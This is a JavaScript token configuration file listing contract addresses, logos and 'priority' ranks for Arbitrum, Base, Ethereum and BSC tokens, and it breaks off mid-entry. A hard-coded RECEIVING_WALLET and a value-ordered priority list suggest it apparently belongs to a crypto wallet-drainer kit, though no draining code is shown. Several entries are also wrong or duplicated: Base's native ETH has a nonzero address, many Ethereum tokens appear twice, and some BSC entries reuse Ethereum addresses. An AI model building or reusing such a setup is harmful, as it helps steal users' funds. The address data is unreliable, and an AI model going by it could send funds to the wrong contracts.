// config/tokens.js
var RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";

var TOKENS = {
  arbitrum: [
    {
      name: "Ethereum",
      symbol: "ETH",
      address: "0x0000000000000000000000000000000000000000",
      logo: "https://assets.coingecko.com/coins/images/279/standard/ethereum.png",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 999
    },
    {
      name: "Tether USD",
      symbol: "USDT",
      address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
      logo: "https://assets.coingecko.com/coins/images/325/standard/Tether.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 1
    },
    {
      name: "USD Coin",
      symbol: "USDC",
      address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831",
      logo: "https://assets.coingecko.com/coins/images/6319/standard/usdc.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 2
    },
    {
      name: "Dai Stablecoin",
      symbol: "DAI",
      address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",
      logo: "https://assets.coingecko.com/coins/images/9956/standard/Badge_Dai.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 3
    },
    {
      name: "Wrapped Bitcoin",
      symbol: "WBTC",
      address: "0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f",
      logo: "https://assets.coingecko.com/coins/images/7598/standard/wrapped_bitcoin_wbtc.png",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 4
    },
    {
      name: "Arbitrum",
      symbol: "ARB",
      address: "0x912CE59144191C1204E64559FE8253a0e49E6548",
      logo: "https://assets.coingecko.com/coins/images/16547/standard/photo_2023-03-29_21.47.00.jpeg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 5
    },
    {
      name: "GMX",
      symbol: "GMX",
      address: "0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a",
      logo: "https://assets.coingecko.com/coins/images/18323/standard/arbit.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 6
    },
    {
      name: "Radiant Capital",
      symbol: "RDNT",
      address: "0x3082CC23568eA640225c2467653dB90e9250AaA0",
      logo: "https://assets.coingecko.com/coins/images/26536/standard/RDNT_icon_200x200.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 7
    },
    {
      name: "Stargate Finance",
      symbol: "STG",
      address: "0x6694340fc020c5E6B96567843da2df01b2CE1eb6",
      logo: "https://assets.coingecko.com/coins/images/24413/standard/stg_logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 8
    },
    {
      name: "Magic Internet Money",
      symbol: "MIM",
      address: "0xFEa7a6a0B346362BF88A9e4A88416B77a57D6c2A",
      logo: "https://assets.coingecko.com/coins/images/16786/standard/mimlogopng.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 9
    },
    {
      name: "PlutusDAO",
      symbol: "PLS",
      address: "0x51318B7D00db7ACc4026C88c3952B66278B6A67F",
      logo: "https://assets.coingecko.com/coins/images/24738/standard/pls.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 10
    },
    {
      name: "Jones DAO",
      symbol: "JONES",
      address: "0x10393c20975cF177a3513071bC110f7962CD67da",
      logo: "https://assets.coingecko.com/coins/images/25457/standard/jones_icon.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 11
    },
    {
      name: "Dopex",
      symbol: "DPX",
      address: "0x6C2C06790b3E3E3c38e12Ee22F8183b37a13EE55",
      logo: "https://assets.coingecko.com/coins/images/16688/standard/DPX_%281%29.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 12
    },
    {
      name: "Wombat Exchange",
      symbol: "WOM",
      address: "0x7b5eb3940021ec0e8e463d5dbb4b7b09a89ddf96",
      logo: "https://assets.coingecko.com/coins/images/26442/standard/wom_logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 13
    },
    {
      name: "Vertex Protocol",
      symbol: "VRTX",
      address: "0x95146881b86b3ee99e63705ec87afe29fcc044d9",
      logo: "https://assets.coingecko.com/coins/images/28267/standard/vertex.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 14
    },
    {
      name: "Cap Finance",
      symbol: "CAP",
      address: "0x031d35296154279dc1984dcd93e392b1f946737b",
      logo: "https://assets.coingecko.com/coins/images/22817/standard/cap.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 15
    },
    {
      name: "Umami Finance",
      symbol: "UMAMI",
      address: "0x1622bF67e6e5747b81866fE0b85178a93C7F86e3",
      logo: "https://assets.coingecko.com/coins/images/26054/standard/umami.png",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 16
    }
  ],
  
  base: [
    {
      name: "Ethereum",
      symbol: "ETH",
      address: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
      logo: "https://assets.coingecko.com/coins/images/279/standard/ethereum.png",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 999
    },
    {
      name: "USD Coin",
      symbol: "USDC",
      address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
      logo: "https://assets.coingecko.com/coins/images/6319/standard/usdc.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 1
    },
    {
      name: "Dai Stablecoin",
      symbol: "DAI",
      address: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb",
      logo: "https://assets.coingecko.com/coins/images/9956/standard/Badge_Dai.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 2
    },
    {
      name: "Wrapped Ether",
      symbol: "WETH",
      address: "0x4200000000000000000000000000000000000006",
      logo: "https://assets.coingecko.com/coins/images/2518/standard/weth.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 3
    },
    {
      name: "BALD",
      symbol: "BALD",
      address: "0x27D2DECb4bFC9C76F0309b8E88dec3a601Fe25a8",
      logo: "https://assets.coingecko.com/coins/images/30683/standard/bald.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 4
    },
    {
      name: "Tether USD",
      symbol: "USDT",
      address: "0x7c6b91D9Be155A6Db01f749217d76fF02A7227F2",
      logo: "https://assets.coingecko.com/coins/images/325/standard/Tether.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 5
    },
    {
      name: "Base Doge",
      symbol: "BDOGE",
      address: "0x4C2A4fD3686701AFb38d8722256eF52F519c179e",
      logo: "https://assets.coingecko.com/coins/images/35725/standard/bdoge.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 6
    },
    {
      name: "Toshi",
      symbol: "TOSHI",
      address: "0xF4d861575ecC9493420A3f5a14F85B13f0b50EB3",
      logo: "https://assets.coingecko.com/coins/images/36338/standard/toshi.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 7
    },
    {
      name: "Friend.tech Shares",
      symbol: "FRIEND",
      address: "0xCF205808Ed36593aa40a44F10c7f7C2F67d4A4d4",
      logo: "https://assets.coingecko.com/coins/images/36757/standard/friend.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 8
    },
    {
      name: "Based Brett",
      symbol: "BRETT",
      address: "0x532f27101965dd16442E59d40670FaF5eBB142E4",
      logo: "https://assets.coingecko.com/coins/images/36339/standard/Brett.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 9
    },
    {
      name: "Degen",
      symbol: "DEGEN",
      address: "0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed",
      logo: "https://assets.coingecko.com/coins/images/36340/standard/degen.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 10
    },
    {
      name: "Mochi",
      symbol: "MOCHI",
      address: "0xc6e5E6d9C5A3945eDfcf557623C53D2796d3142e",
      logo: "https://assets.coingecko.com/coins/images/36341/standard/mochi.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 11
    },
    {
      name: "Tyler Hobbs Fidenza",
      symbol: "FIDENZA",
      address: "0x3B350F202473932411772C8Cb76DB7975f42397E",
      logo: "https://assets.coingecko.com/coins/images/36342/standard/fidenza.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 12
    },
    {
      name: "Extra Finance",
      symbol: "EXTRA",
      address: "0x2dA3DcF6C44E4D207A9f5e47a5df2aA4DcC308FB",
      logo: "https://assets.coingecko.com/coins/images/35283/standard/extra-icon-200px.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 13
    },
    {
      name: "Parallel Token",
      symbol: "PRIME",
      address: "0xFA980cEd6895AC314E7dE34Ef1bFAE90a5AdD21b",
      logo: "https://assets.coingecko.com/coins/images/28953/standard/prime.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 14
    },
    {
      name: "Seamless Protocol",
      symbol: "SEAM",
      address: "0x1C7a460413dD4e964f96D8dFC56E7223cE88CD85",
      logo: "https://assets.coingecko.com/coins/images/34344/standard/seamless.PNG",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 15
    },
    {
      name: "Aerodrome Finance",
      symbol: "AERO",
      address: "0x940181a94A35A4569E4529A3CDfB74e38FD98631",
      logo: "https://assets.coingecko.com/coins/images/35783/standard/aerodrome.PNG",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 16
    }
  ],

  ethereum: [
    {
      name: "Tether USD",
      symbol: "USDT",
      address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
      logo: "https://assets.coingecko.com/coins/images/325/standard/Tether.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 62
    },
        {
      name: "1inch",
      symbol: "1INCH",
      address: "0x111111111117dC0aa78b770fA6A738034120C302",
      logo: "https://assets.coingecko.com/coins/images/13469/standard/1inch.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 81
    },
    {
      name: "Aavegotchi",
      symbol: "GHST",
      address: "0x3F382DbD960E3a9bbCeaE22651E88158d2791550",
      logo: "https://assets.coingecko.com/coins/images/12467/standard/ghst_200.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 82
    },
    {
      name: "Alchemix",
      symbol: "ALCX",
      address: "0xdBdb4d16EdA451D0503b854CF79D55697F90c8DF",
      logo: "https://assets.coingecko.com/coins/images/14113/standard/Alchemix.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 83
    },
    {
      name: "Alpha Finance",
      symbol: "ALPHA",
      address: "0xa1faa113cbE53436Df28FF0aEe54275c13B40975",
      logo: "https://assets.coingecko.com/coins/images/12738/standard/AlphaToken_256x256.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 84
    },
    {
      name: "Ampleforth",
      symbol: "AMPL",
      address: "0xD46bA6D942050d489DBd938a2C909A5d5039A161",
      logo: "https://assets.coingecko.com/coins/images/4708/standard/Ampleforth.png",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 85
    },
    {
      name: "Ankr Network",
      symbol: "ANKR",
      address: "0x8290333ceF9e6D528dD5618Fb97a76f268f3EDD4",
      logo: "https://assets.coingecko.com/coins/images/4324/standard/U85xTl2.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 86
    },
    {
      name: "Aragon",
      symbol: "ANT",
      address: "0xa117000000f279D81A1D3cc75430fAA017FA5A2e",
      logo: "https://assets.coingecko.com/coins/images/681/standard/JelZldcv_400x400.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 87
    },
    {
      name: "Audius",
      symbol: "AUDIO",
      address: "0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998",
      logo: "https://assets.coingecko.com/coins/images/12913/standard/AudiusCoinLogo_2x.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 88
    },
    {
      name: "Axie Infinity",
      symbol: "AXS",
      address: "0xBB0E17EF65F82Ab018d8EDd776e8DD940327B28b",
      logo: "https://assets.coingecko.com/coins/images/13029/standard/axie-infinity-small-logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 89
    },
    {
      name: "Badger DAO",
      symbol: "BADGER",
      address: "0x3472A5A71965499acd81997a54BBA8D852C6E53d",
      logo: "https://assets.coingecko.com/coins/images/13287/standard/badger_dao_logo.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 90
    },
    {
      name: "Balancer",
      symbol: "BAL",
      address: "0xba100000625a3754423978a60c9317c58a424e3D",
      logo: "https://assets.coingecko.com/coins/images/11683/standard/Balancer.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 91
    },
    {
      name: "Bancor Network Token",
      symbol: "BNT",
      address: "0x1F573D6Fb3F13d689FF844B4cE37794d79a7FF1C",
      logo: "https://assets.coingecko.com/coins/images/736/standard/bancor.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 92
    },
    {
      name: "BarnBridge",
      symbol: "BOND",
      address: "0x0391D2021f89DC339F60Fff84546EA23E337750f",
      logo: "https://assets.coingecko.com/coins/images/12811/standard/barnbridge.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 93
    },
    {
      name: "Basic Attention Token",
      symbol: "BAT",
      address: "0x0D8775F648430679A709E98d2b0Cb6250d2887EF",
      logo: "https://assets.coingecko.com/coins/images/677/standard/basic-attention-token.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 94
    },
    {
      name: "BitDAO",
      symbol: "BIT",
      address: "0x1A4b46696b2bB4794Eb3D4c26f1c55F9170fa4C5",
      logo: "https://assets.coingecko.com/coins/images/17627/standard/rI_YptK8.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 95
    },
    {
      name: "Biconomy",
      symbol: "BICO",
      address: "0xF17e65822b568B3903685a7c9F496CF7656Cc6C2",
      logo: "https://assets.coingecko.com/coins/images/21061/standard/biconomy_logo.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 96
    },
    {
      name: "Bluzelle",
      symbol: "BLZ",
      address: "0x5732046A883704404F284Ce41FfADd5b007FD668",
      logo: "https://assets.coingecko.com/coins/images/2848/standard/bluzelle.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 97
    },
    {
      name: "Braintrust",
      symbol: "BTRST",
      address: "0x799ebfABE77a6E34311eeEe9825190B9ECe32824",
      logo: "https://assets.coingecko.com/coins/images/18100/standard/braintrust.PNG",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 98
    },
    {
      name: "Cartesi",
      symbol: "CTSI",
      address: "0x491604c0FDF08347Dd1fa4Ee062a822A5DD06B5D",
      logo: "https://assets.coingecko.com/coins/images/11038/standard/cartesi.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 99
    },
    {
      name: "Celer Network",
      symbol: "CELR",
      address: "0x4F9254C83EB525f9fCF346490bbb3ed28a81C667",
      logo: "https://assets.coingecko.com/coins/images/4379/standard/Celr.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 100
    },
    {
      name: "Chiliz",
      symbol: "CHZ",
      address: "0x3506424F91fD33084466F402d5D97f05F8e3b4AF",
      logo: "https://assets.coingecko.com/coins/images/8834/standard/Chiliz.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 101
    },
    {
      name: "Chromia",
      symbol: "CHR",
      address: "0x8A2279d4A90B6fe1C4B30fa660cC9f926797bAA2",
      logo: "https://assets.coingecko.com/coins/images/5000/standard/Chromia.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 102
    },
    {
      name: "Coin98",
      symbol: "C98",
      address: "0xAE12C5930881c53715B369ceC7606B70d8EB229f",
      logo: "https://assets.coingecko.com/coins/images/17117/standard/logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 103
    },
    {
      name: "Compound",
      symbol: "COMP",
      address: "0xc00e94Cb662C3520282E6f5717214004A7f26888",
      logo: "https://assets.coingecko.com/coins/images/10775/standard/COMP.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 104
    },
    {
      name: "Convex Finance",
      symbol: "CVX",
      address: "0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B",
      logo: "https://assets.coingecko.com/coins/images/15585/standard/convex.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 105
    },
    {
      name: "COTI",
      symbol: "COTI",
      address: "0xDDB3422497E61e13543BeA06989C0789117555c5",
      logo: "https://assets.coingecko.com/coins/images/2962/standard/Coti.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 106
    },
    {
      name: "Covalent",
      symbol: "CQT",
      address: "0xD417144312DbF50465b1C641d016962017Ef6240",
      logo: "https://assets.coingecko.com/coins/images/14168/standard/covalent-cqt.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 107
    },
    {
      name: "Cream Finance",
      symbol: "CREAM",
      address: "0x2ba592F78dB6436527729929AAf6c908497cB200",
      logo: "https://assets.coingecko.com/coins/images/11976/standard/Cream.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 108
    },
    {
      name: "Curve DAO Token",
      symbol: "CRV",
      address: "0xD533a949740bb3306d119CC777fa900bA034cd52",
      logo: "https://assets.coingecko.com/coins/images/12124/standard/Curve.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 109
    },
    {
      name: "DIA",
      symbol: "DIA",
      address: "0x84cA8bc7997272c7CfB4D0Cd3D55cd942B3c9419",
      logo: "https://assets.coingecko.com/coins/images/11955/standard/DIA-icon-colour_%281%29.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 110
    },
    {
      name: "DODO",
      symbol: "DODO",
      address: "0x43Dfc4159D86F3A37A5A4B3D4580b888ad7d4DDd",
      logo: "https://assets.coingecko.com/coins/images/12651/standard/dodo_logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 111
    },
    {
      name: "Dogecoin",
      symbol: "DOGE",
      address: "0x4206931337dc273a630d328dA6441786BfaD668f",
      logo: "https://assets.coingecko.com/coins/images/5/standard/dogecoin.png",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 112
    },
    {
      name: "dYdX",
      symbol: "DYDX",
      address: "0x92D6C1e31e14520e676a687F0a93788B716BEff5",
      logo: "https://assets.coingecko.com/coins/images/17500/standard/dydx.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 113
    },
    {
      name: "Enjin Coin",
      symbol: "ENJ",
      address: "0xF629cBd94d3791C9250152BD8dfBDF380E2a3B9c",
      logo: "https://assets.coingecko.com/coins/images/1102/standard/enjin-coin-logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 114
    },
    {
      name: "Ethereum Name Service",
      symbol: "ENS",
      address: "0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72",
      logo: "https://assets.coingecko.com/coins/images/19785/standard/acatxTm8_400x400.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 115
    },
    {
      name: "Fetch.ai",
      symbol: "FET",
      address: "0xaea46A60368A7bD060eec7DF8CBa43b7EF41Ad85",
      logo: "https://assets.coingecko.com/coins/images/5681/standard/Fetch.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 116
    },
    {
      name: "Filecoin",
      symbol: "FIL",
      address: "0x6e1A19F235bE7ED8E3369eF73b196C07257494DE",
      logo: "https://assets.coingecko.com/coins/images/12817/standard/filecoin.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 117
    },
    {
      name: "Frax Share",
      symbol: "FXS",
      address: "0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0",
      logo: "https://assets.coingecko.com/coins/images/13423/standard/frax_share.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 118
    },
    {
      name: "Gala",
      symbol: "GALA",
      address: "0x15D4c048F83bd7e37d49eA4c83a07267Ec4203dA",
      logo: "https://assets.coingecko.com/coins/images/12493/standard/GALA-COINGECKO.png",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 119
    },
    {
      name: "Gitcoin",
      symbol: "GTC",
      address: "0xDe30da39c46104798bB5aA3fe8B9e0e1F348163F",
      logo: "https://assets.coingecko.com/coins/images/15810/standard/gitcoin.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 120
    },
    {
      name: "Gods Unchained",
      symbol: "GODS",
      address: "0xccC8cb5229B0ac8069C51fd58367Fd1e622aFD97",
      logo: "https://assets.coingecko.com/coins/images/17139/standard/10631.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 121
    },
    {
      name: "Holo",
      symbol: "HOT",
      address: "0x6c6EE5e31d828De241282B9606C8e98Ea48526E2",
      logo: "https://assets.coingecko.com/coins/images/3348/standard/Holologo_Profile.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 122
    },
    {
      name: "HUSD",
      symbol: "HUSD",
      address: "0xdF574c24545E5FfEcb9a659c229253D4111d87e1",
      logo: "https://assets.coingecko.com/coins/images/9567/standard/HUSD.jpg",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 123
    },
    {
      name: "Immutable X",
      symbol: "IMX",
      address: "0xF57e7e7C23978C3cAEC3C3548E3D615c346e79fF",
      logo: "https://assets.coingecko.com/coins/images/17233/standard/imx.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 124
    },
    {
      name: "Injective",
      symbol: "INJ",
      address: "0xe28b3B32B6c345A34Ff64674606124Dd5Aceca30",
      logo: "https://assets.coingecko.com/coins/images/12882/standard/injective_logo.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 125
    },
    {
      name: "IoTeX",
      symbol: "IOTX",
      address: "0x6fB3e0A217407EFFf7Ca062D46c26E5d60a14d69",
      logo: "https://assets.coingecko.com/coins/images/3334/standard/iotex-logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 126
    },
    {
      name: "JasmyCoin",
      symbol: "JASMY",
      address: "0x7420B4b9a0110cdC71fB720908340C03F9Bc03EC",
      logo: "https://assets.coingecko.com/coins/images/13876/standard/JasmyCoin.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 127
    },
    {
      name: "Keep Network",
      symbol: "KEEP",
      address: "0x85Eee30c52B0b379b046Fb0F85F4f3Dc3009aFEC",
      logo: "https://assets.coingecko.com/coins/images/3373/standard/IuNzUb5b_400x400.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 128
    },
    {
      name: "Kyber Network Crystal",
      symbol: "KNC",
      address: "0xdeFA4e8a7bcBA345F687a2f1456F5Edd9CE97202",
      logo: "https://assets.coingecko.com/coins/images/14899/standard/RwdVsGcw_400x400.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 129
    },
    {
      name: "Liquity",
      symbol: "LQTY",
      address: "0x6DEA81C8171D0bA574754EF6F8b412F2Ed88c54D",
      logo: "https://assets.coingecko.com/coins/images/14665/standard/200-lqty-icon.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 130
    },
    {
      name: "USD Coin",
      symbol: "USDC",
      address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
      logo: "https://assets.coingecko.com/coins/images/6319/standard/usdc.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 63
    },
    {
      name: "Dai Stablecoin",
      symbol: "DAI",
      address: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
      logo: "https://assets.coingecko.com/coins/images/9956/standard/Badge_Dai.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 64
    },
    {
      name: "Wrapped Ethereum",
      symbol: "WETH",
      address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
      logo: "https://assets.coingecko.com/coins/images/2518/standard/weth.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 65
    },
    {
      name: "Ethereum",
      symbol: "ETH",
      address: "0x0000000000000000000000000000000000000000",
      logo: "https://assets.coingecko.com/coins/images/279/standard/ethereum.png",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 997
    },
    {
      name: "Lido Staked Ether",
      symbol: "stETH",
      address: "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84",
      logo: "https://assets.coingecko.com/coins/images/13442/standard/steth_logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 66
    },
    {
      name: "Maker",
      symbol: "MKR",
      address: "0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2",
      logo: "https://assets.coingecko.com/coins/images/1364/standard/Mark_Maker.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 67
    },
    {
      name: "ApeCoin",
      symbol: "APE",
      address: "0x4d224452801ACEd8B2F0aebE155379bb5D594381",
      logo: "https://assets.coingecko.com/coins/images/24383/standard/apecoin.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 68
    },
    {
      name: "Frax",
      symbol: "FRAX",
      address: "0x853d955aCEf822Db058eb8505911ED77F175b99e",
      logo: "https://assets.coingecko.com/coins/images/13422/standard/frax_logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 69
    },
    {
      name: "Frax Share",
      symbol: "FXS",
      address: "0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0",
      logo: "https://assets.coingecko.com/coins/images/13423/standard/frax_share.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 70
    },
    {
      name: "Rocket Pool ETH",
      symbol: "rETH",
      address: "0xae78736Cd615f374D3085123A210448E74Fc6393",
      logo: "https://assets.coingecko.com/coins/images/20764/standard/reth.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 71
    },
    {
      name: "Liquity USD",
      symbol: "LUSD",
      address: "0x5f98805A4E8be255a32880FDeC7F6728C6568bA0",
      logo: "https://assets.coingecko.com/coins/images/14666/standard/Group_3.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 72
    },
    {
      name: "Aurora",
      symbol: "AURORA",
      address: "0xaaaaaa20d9e0e2461697782ef11675f668207961",
      logo: "https://assets.coingecko.com/coins/images/18408/standard/aurora.jpeg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 73
    },
    {
      name: "Celer Network",
      symbol: "CELR",
      address: "0x4f9254c83eb525f9fcf346490bbb3ed28a81c667",
      logo: "https://assets.coingecko.com/coins/images/4379/standard/Celr.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 74
    },
    {
      name: "Convex Finance",
      symbol: "CVX",
      address: "0x4e3fbd56cd56c3e72c1403e103b45db9da5b9d2b",
      logo: "https://assets.coingecko.com/coins/images/15585/standard/convex.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 75
    },
    {
      name: "DEXTools",
      symbol: "DEXT",
      address: "0xfb7b4564402e5500db5bb6d63ae671302777c75a",
      logo: "https://assets.coingecko.com/coins/images/11603/standard/dext.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 76
    },
    {
      name: "Gala",
      symbol: "GALA",
      address: "0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA",
      logo: "https://assets.coingecko.com/coins/images/12493/standard/GALA-COINGECKO.png",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 77
    },
    {
      name: "Illuvium",
      symbol: "ILV",
      address: "0x767FE9EDC9E0dF98E07454847909b5E959D7ca0E",
      logo: "https://assets.coingecko.com/coins/images/14468/standard/ILV.JPG",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 78
    },
    {
      name: "JasmyCoin",
      symbol: "JASMY",
      address: "0x7420B4b9a0110cdC71fB720908340C03F9Bc03EC",
      logo: "https://assets.coingecko.com/coins/images/13876/standard/JasmyCoin.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 79
    },
    {
      name: "Keep Network",
      symbol: "KEEP",
      address: "0x85Eee30c52B0b379b046Fb0F85F4f3Dc3009aFEC",
      logo: "https://assets.coingecko.com/coins/images/3373/standard/IuNzUb5b_400x400.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 80
    }
  ],

  bsc: [
    {
      name: "AUTO",
      symbol: "AUTO",
      address: "0xa184088a740c695e156f91f5cc086a06bb78b827",
      logo: "https://assets.coingecko.com/coins/images/13751/standard/autofarm_icon_200x200.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 1
    },
    {
      name: "Tether USD",
      symbol: "USDT",
      address: "0x55d398326f99059fF775485246999027B3197955",
      logo: "https://assets.coingecko.com/coins/images/325/standard/Tether.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 2
    },
        {
      name: "1inch",
      symbol: "1INCH",
      address: "0x111111111117dC0aa78b770fA6A738034120C302",
      logo: "https://assets.coingecko.com/coins/images/13469/standard/1inch.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 47
    },
    {
      name: "Alpha Finance",
      symbol: "ALPHA",
      address: "0xa1faa113cbE53436Df28FF0aEe54275c13B40975",
      logo: "https://assets.coingecko.com/coins/images/12738/standard/AlphaToken_256x256.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 48
    },
    {
      name: "Axie Infinity Shard",
      symbol: "AXS",
      address: "0x715D400F88C167884bbCc41C5FeA407ed4D2f8A0",
      logo: "https://assets.coingecko.com/coins/images/13029/standard/axie-infinity-small-logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 49
    },
    {
      name: "BakeryToken",
      symbol: "BAKE",
      address: "0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5",
      logo: "https://assets.coingecko.com/coins/images/12588/standard/bakerytoken_logo.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 50
    },
    {
      name: "Band Protocol",
      symbol: "BAND",
      address: "0xAD6cAEb32CD2c308980a548bD0Bc5AA4306c6c18",
      logo: "https://assets.coingecko.com/coins/images/9445/standard/band-protocol.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 51
    },
    {
      name: "Binance-Peg BUSD",
      symbol: "BUSD",
      address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
      logo: "https://assets.coingecko.com/coins/images/9576/standard/BUSD.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 52
    },
    {
      name: "Binance-Peg Cardano",
      symbol: "ADA",
      address: "0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47",
      logo: "https://assets.coingecko.com/coins/images/975/standard/cardano.png",
      abi: ERC20_ABI,
      decimals: 18,
